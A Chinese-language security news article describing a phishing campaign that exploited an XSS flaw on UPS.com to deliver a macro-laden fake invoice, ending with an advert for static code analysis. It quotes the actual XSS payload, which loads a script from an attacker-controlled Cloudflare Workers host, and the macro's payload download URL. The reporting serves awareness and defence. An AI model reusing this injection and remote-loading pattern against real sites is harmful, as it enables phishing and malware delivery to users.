一个巧妙的网络钓鱼活动利用UPS.com中的XSS漏洞来推送虚假和恶意的“invoice"Word 文档。

UPS快递公司(UPS
Express，联合包裹服务公司)是世界上最大的快递承运商与包裹递送公司。公司创办1907年，每天在全球200多个国家和地区提供物流服务，年营业额超过500亿美元。

网络钓鱼骗局最初是由安全研究人员丹尼尔·加拉格尔发现的，他假装是一封来自UPS的电子邮件，声称一个包裹有“例外”，需要客户取走。

这次网络钓鱼攻击的突出之处在于，威胁行为者利用UPS.com的跨站攻击漏洞，将该网站的常规页面修改为看起来像一个合法的下载页面。

此漏洞允许威胁行为者通过远程Cloudflare工作人员分发恶意文档，但使其看起来像是直接从UPS.com下载的。

## 剖析 UPS 网络钓鱼骗局

这个电子邮件充满了大量的合法链接，没有执行恶意行为。然而，这个追踪号码是一个链接到UPS网站的链接，其中包含一个XSS漏洞，当页面打开时，该漏洞会向浏览器注入恶意JavaScript。

![](https://image.3001.net/images/20210827/1630032033_612850a188003af0a5950.png!small)

UPS 网络钓鱼电子邮件

当前无法加载图像，因为攻击者的站点已关闭

下面可以看到用于跟踪号码的URL经过清理后的版本，原始的URL被进一步混淆了。

![](https://image.3001.net/images/20210827/1630032057_612850b9bb99d00807ae0.png!small)

网络钓鱼诈骗中使用的URL

这个URL有两个有趣的字符串用作攻击的一部分，其中第一项是以下base64编码的字符串:

>
> MSBqVTU3IE4zM2QgNzAgbTRLMyA3aDE1IFVSTCA0IGwxNzdsMyBMMG45M3IgNzAgSDFEMyBuM3g3IHFVM3JZIFA0UjRNLCB5MHUgNExSMzREeSBLbjB3IFdoWSA7KQ==

base64字符串包含来自威胁参与者的注释，该注释有助于解释该字符串用于使URL变长，以隐藏附加到URL末尾的XSS利用查询参数。

> 1 jU57 N33d 70 m4K3 7h15 URL 4 l177l3 L0n93r 70 H1D3 n3x7 qU3rY P4R4M, y0u
> 4LR34Dy Kn0w WhY ;)

第二点是当用户访问UPS.com网站时注入的JavaScript跨站漏洞。

> img src="x"
> onerror="Function(atob('JC5nZXRTY3JpcHQoJ2h0dHBzOi8vbS5tZWRpYS1hbWF6b24ud29ya2Vycy5kZXYvanMnKQ=='))()

atob()函数中解码的base64字符串包含Cloudflare工作人员脚本的URL，该漏洞将加载该脚本。

> $.getScript('https://m.media-amazon.workers.dev/js')

Gallagher在Urlscan上捕获的Cloudflare工作人员脚本，将导致UPS页面显示一条消息，表明有文件正在下载。

![](https://image.3001.net/images/20210827/1630032113_612850f1435ea7aae71d8.png!small)

Cloudflare 工作脚本用作 UPS XSS 攻击的一部分

XSS漏洞注入的Cloudflare worker脚本将导致UPS网站显示下载页面，如下所示。

![](https://image.3001.net/images/20210827/1630032137_6128510903102ec452642.png!small)

利用导致UPS页面显示下载屏幕

最终，该页面将从攻击者的Cloudflare项目下载恶意的Word文档[VirusTotal]。

这种网络钓鱼活动手段非常聪明，因为用户访问URL将看到一个合法的ups.com
URL提示下载invoice，这种策略可能会使受害者在打开invoice时少一些怀疑，认为这是UPS的真实文件。

目前显示，UPS.com的跨站漏洞已经修复。

## 神秘的假“invoice”文件

下载的文件名为“invoice_1Z7301XR1412220178”，假装是UPS的运输invoice。当打开文档时，所有文本都将无法读取，并且文档会提示用户“启用内容”以正确查看它。

![](https://image.3001.net/images/20210827/1630032176_61285130ea86bf77e397c.png!small)

恶意invoice word文档

启用后，宏将尝试下载文件https://divine-bar-3d75.visual-candy.workers.dev/blackhole.png。

但是，此URL不再有效，因此无法查看有效负载。

![](https://image.3001.net/images/20210827/1630032191_6128513f1e135638e1823.png!small)

伪造的 UPS invoice中的宏

这种网络钓鱼骗局说明了威胁行为者在散布恶意文件时，不断在发展和创新其技术手段，虽然邮件发送者清楚地显示了一个可疑域名，但由XSS漏洞允许URL和下载页面从UPS合法出现，这会让很多人信以为真。

根据CNVD(国家信息安全漏洞共享平台)统计，软件漏洞比例最高占全部网络漏洞的80%，而在OWASP TOP
10安全漏洞中，60-70%的安全漏洞类型都是通过源代码静态分析技术检测出来的，如XSS、注入漏洞、XXE等。而以上钓鱼攻击利用的XSS是OWASP TOP
10中第二普遍的安全问题，存在于近三分之二的应用中。自动化技术可以自动发现一些XSS问题，特别是在一些成熟的技术中，如PHP、ASP.NET等。因此在软件开发过程中，为了加强网络安全建设提高软件安全性，有必要通过[静态代码检测](https://www.woocoom.com/b031.html)等工具检测代码缺陷及运行时缺陷，并查找更多的已知/未知深度安全漏洞并及时修复，这不但为现有的网络防护手段做好重要补充，而且也能将安全问题修复成本降至最低。

> 参读链接：
>
> <https://www.woocoom.com/b021.html?id=a17a5f0a907340ff807161e585fed88f>
>
> https://www.bleepingcomputer.com/news/security/phishing-campaign-uses-> upscom-xss-vuln-to-distribute-malware/
>
> http://www.99lb.net/8382b.html

